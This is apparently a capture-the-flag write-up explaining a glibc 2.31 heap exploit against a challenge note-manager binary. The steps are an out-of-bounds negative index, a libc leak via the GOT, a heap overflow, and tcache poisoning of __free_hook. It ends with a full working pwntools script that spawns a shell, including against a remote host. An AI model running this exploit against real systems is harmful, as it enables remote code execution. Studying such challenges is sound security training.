---
title: '[Writeup] - JHT PWN'
tag: ['PWN', 'Writeup']
cover: /img/post/writeup/jht/thumbnail.png
category: ['Writeup']
date: 2025-06-20 00:14:35
author:
    - zexecq
---
Tag : CTF, Challenges, Heap, Tcache Poisoning

Link to chall : https://drive.google.com/file/d/1-hH-UsPbvmHr48W2HkY63XUVURYhMWvd/view?usp=sharing

## Analysis

### Source

`menu()`

```c
int menu()
{
  puts("1. Add a note");
  puts("2. Edit a note");
  puts("3. Remove a note");
  puts("4. Read a note");
  puts("5. Exit");
  return printf("> ");
}
```

`main()`

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v5; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("Notebook v1.0 - Beta version");
  puts("A place where you can save your note!\n");
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &choice);
    printf("Index: ");
    __isoc99_scanf("%d", &v5);
    switch ( choice )
    {
      case 1:
        add_note(v5);
        break;
      case 2:
        edit_note(v5);
        break;
      case 3:
        remove_note(v5);
        break;
      case 4:
        read_note(v5);
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
}
```

`read_note()`

```c
int __fastcall read_note(int a1)
{
  if ( a1 <= 4 )
  {
    if ( book[a1] )
    {
      return printf("Data: %s\n", (const char *)book[a1]); // Out Of Bound
    }
    else
    {
      puts("No note here!");
      return 0;
    }
  }
  else
  {
    puts("Invalid index!");
    return 0;
  }
}
```

`remove_note()`

```c
int __fastcall remove_note(int a1)
{
  if ( a1 <= 4 )
  {
    if ( book[a1] )
    {
      free((void *)book[a1]);
      book[a1] = 0LL;
      return puts("Done!");
    }
    else
    {
      puts("No note here!");
      return 0;
    }
  }
  else
  {
    puts("Invalid index!");
    return 0;
  }
}
```

`edit_note()`

```c
int __fastcall edit_note(int idx)
{
  if ( idx <= 4 )
  {
    if ( book[idx] )                            // Out Of Bound
    {
      printf("Data: ");
      read(0, (void *)book[idx], (unsigned int)notesize[idx]);
      return puts("Done!");
    }
    else
    {
      puts("No note here!");
      return 0;
    }
  }
  else
  {
    puts("Invalid index!");
    return 0;
  }
}
```

`add_note()`

```c
int __fastcall add_note(int idx)
{
  _DWORD size[3]; // [rsp+14h] [rbp-Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  if ( idx <= 4 )
  {
    printf("Size: ");
    __isoc99_scanf("%d", size);
    if ( size[0] <= 0x410u )
    {
      notesize[idx] = size[0];
      book[idx] = (__int64)malloc(size[0]);
      memset((void *)book[idx], 0, size[0]);    // set all to 0
      printf("Data: ");
      read(0, (void *)book[idx], size[0]);
      return puts("Done!");
    }
    else
    {
      puts("Invalid size!");
      return 0;
    }
  }
  else
  {
    puts("Invalid index!");
    return 0;
  }
}
```

### Checksec

![image.png](/img/post/writeup/jht/checksec.png)

### Build idea

I can’t see the win() function to call flag or shell, so maybe i will do it for my own. We got `libc-2.31`, different to current version (`libc-2.40`) so i will try to take addvantage from it so for now my pseudo goal is *call shell from system*.

We got some `malloc`’s call and some `Out Of Bound` i noted on the source because of it only need 

`idx` no more than `4` and it is `unsigned int` so we can go below `0`

Besides it i will go further for heap exploit.

## Exploit

With `Out Of Bound (OOB)` we can : 

- add note - write  address got malloc to somewhere
- read note - read some value from somewhere, for now i think i need some address have libc address

While debugging, i see two variable `notesize[]`, `book[]` is side by side 

```c
00:0000│  0x4040c0 (notesize) ◂— 0xa00000000
01:0008│  0x4040c8 (notesize+8) ◂— 0
... ↓     3 skipped
05:0028│  0x4040e8 (book+8) —▸ 0x4052a0 ◂— 'aaaaaaaa\n'
06:0030│  0x4040f0 (book+16) ◂— 0
07:0038│  0x4040f8 (book+24) ◂— 0
```

and with `OOB` we can bypass this:

```c
in edit_note():
read(0, (void *)book[idx], (unsigned int)notesize[idx]);

in add_note():
if ( size[0] <= 0x410u )

```

let me explain, when adding note, size it can’t be more than `0x410u` but because of `notesize` is array next to `book` so if we make a `book` with index < 0 we can overwrite `notesize` with some value

So i will make a book[0] with size is 10 and a book[-4], then debug i think i can see something.

```c
00:0000│  0x4040c0 (notesize) —▸ 0x4052c0 ◂— 0xa342d342d342d /* '-4-4-4\n' */
01:0008│  0x4040c8 (notesize+8) ◂— 0
... ↓     2 skipped
04:0020│  0x4040e0 (book) —▸ 0x4052a0 ◂— 'abcdefg\n'
05:0028│  0x4040e8 (book+8) ◂— 0
... ↓     2 skipped
```

with size of book[0] has size with notesize[0], but create another book[-4] will overwrite it to some malloc address and now, value of notesize[0] become to `0x4040c0` 

so it means we can have input more than before.

![image.png](/img/post/writeup/jht/1.png)

⇒ We got `Heap Overflow` 

If we got `heap Overflow` so maybe we could use `tcache poisoning` technique. Unil now, my raw map I think is :

`Heap Overflow` → `tcache poisoning` then we can call system, maybe.

To confirm that can use `tcache poisoning`, we must do some research because `tcache poisoning` is almost dependent on libc version, I need to check if this libc version (`libc-2.31`) have some vulnerabilities and i found `__malloc_hook` called when using `free()`.  

### Research

Note : If you already know about `__malloc_hook` you can continue to exploit phase.

Do some research and i find this, it’s help me alots https://ctftime.org/writeup/34804

Let me explain, `Glibc < 2.34` will have a memory for pre-free is `__malloc_hook` 

with libc version i mentioned, when you call `free()` function, it will check `__malloc_hook` if exist data or not. I will show my deep road while dive in into `free()` in these pictures : 

when you call `free()`, it will check if  `__malloc_hook` has some data, if not, do `free()` like normal action. It check by take the value  at `__free_hook` and assign it again for `rax` then call 
`test rax,rax` (AND bit) and `jne` (jump if not equal) and jump if `test` answer’s is *not zero*.  

![image.png](/img/post/writeup/jht/2.png)

Here is `__free_hook` memory:

![image.png](/img/post/writeup/jht/3.png)

⇒ So what if i got something for this memory ?

i overwrite value is `system` address in this function, and debug again so what we can see in it !

![image.png](/img/post/writeup/jht/4.png)

So `test rax,rax` do some FLAG stuff and will jump to `free+152`

![image.png](/img/post/writeup/jht/5.png)

And you can see in the pictures, it will lead to `jmp rax` at `free+161` 
and `rax` is a value of `__free_hook` - the address i setup - `address system` 

In summary, it means :

**with `Glibc < 2.34`, will exist a memory name `__free_hook` and when you call `free()`, it will check for this memory if it exist some value, it will jump into that value, but if not, free as normal. Take advantage from it, we could prepare poison  for tcache in these  versions.**

### Attack road

We need `system()` address in libc written into `__malloc_hook`, we need `rdi` is an address has value `“/bin/sh”`

Luckily, the way we exploit `__malloc_hook` won’t change anything while call `free(arg)`, `rdi` always be `arg`. You can look back to final pictures, i freed a memory with data is `“/bin/sh”` and rdi still got that. It means we only set up for `system()`.

I always find root by follow its branch, so I will find way by reverse the way : 

`__malloc_hook` has `system()` address → `Tcache poisoning` → `Heap overflow` can overwrite linked address → `Out Of Bound`  for overwrite size of book + `leak libc` address

I use `read_note()` to read a value from an address, And with my experiment, `GOT` always has libc address, so if i can find some address calling to GOT address, it can leak libc address.

You can see that I search for `scanf` address for somewhere and find in `0x400798`. 

![image.png](/img/post/writeup/jht/6.png)

calculate from `book[]`, the index is `-1833`, build payload and decode, I got libc address.

→ We could find `System()` address.

For `tcache poisoning`, we will using `heap overflow` and to use it, we need to overwrite size of book i mentioned before, so here is how I do it :

- Create 3 books with index 0, 2, 3. Im not using index 1 because if you overwrite notesize - 4 byte with 8 byte, index 1 will affected, so to avoid it, use 2 and 3 or more.

![image.png](/img/post/writeup/jht/7.png)

- Free index 3 then to 2 for tcache linked

![image.png](/img/post/writeup/jht/8.png)

- Create a `book[-4]` and overwrite size of `book[0]` ⇒ Bypass size of note.

![image.png](/img/post/writeup/jht/9.png)

- Padding until Overwrite the linked address

![image.png](/img/post/writeup/jht/10.png)

![image.png](/img/post/writeup/jht/11.png)

- Malloc with that size again and we got a variable with data pointed into __free_hook and add `system()` address.

![image.png](/img/post/writeup/jht/12.png)

Every thing has been setup,call `remove_note()` and debug at `free()` to see what happen : 

![image.png](/img/post/writeup/jht/13.png)

It will jump to `rax`, the `system()` address with `rdi` is a memory with `“/bin/sh"`

*PWN ! Did your brain got poisoned ?* 

# Payload

```c
from pwn import *
import sys

def add_note(p,idx,size,data):
    idx = idx.encode()
    size = size.encode()
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'Index',idx)
    p.sendlineafter(b'Size: ',size)
    p.sendlineafter(b'Data: ',data)

def edit_note(p,idx,data):
    idx = idx.encode()
    # data = data.encode()
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'Index',idx)
    p.sendafter(b'Data: ',data)

def remove_note(p,idx):
    idx = idx.encode()
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'Index',idx)

def read_note(p,idx):
    idx = idx.encode()
    p.sendlineafter(b'> ',b'4')
    p.sendlineafter(b'Index',idx)
if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

    gdb.attach(p,
'''
b*add_note+166
b*remove_note+115
b*read_note
b*edit_note
c
'''
)

else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

########## LEAK LIBC ##########  
read_note(p,'-1833')
p.recvuntil(b'Data: ')
libc_leak = p.recv(6) + b'\0'*2
libc_leak = u64(libc_leak)
log.info('libc leak : ' + hex(libc_leak))
offet_to_libc_base = 0x59140
libc_base = libc_leak - offet_to_libc_base
log.info('libc base : ' + hex(libc_base))

######### OVERWRITE __FREE_HOOK ##########
add_note(p,'0','128',b'this is 0')
add_note(p,'2','128',b'this is 2')
add_note(p,'3','128',b'this is 3')
remove_note(p,'3')
remove_note(p,'2')

offset_to_free_hook = 0x1c5b28
offset_to_system = 0x49970
free_hook = libc_base + offset_to_free_hook
system = libc_base + offset_to_system

payload = b'a'*144 +  p64(free_hook)
add_note(p,'-4','256',b'poison')
edit_note(p,'0',payload)

############# GET SHELL ##############
payload = system
add_note(p,'2','128',b'/bin/sh')
add_note(p,'3','128',p64(payload))

remove_note(p,'2')

p.interactive()
```